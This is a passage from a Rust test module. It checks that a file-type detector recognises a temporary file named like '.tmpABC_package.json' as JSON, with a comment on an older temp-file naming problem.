        // Old behavior: TempBuilder::new().suffix("_package.json") produces
        // a filename like ".tmpXXXXXX_package.json" which doesn't match.
        let det = detect(Path::new("/tmp/.tmpABC_package.json"), b"{}").unwrap();
        assert_eq!(det.file_type, FileType::Json);
    }
}
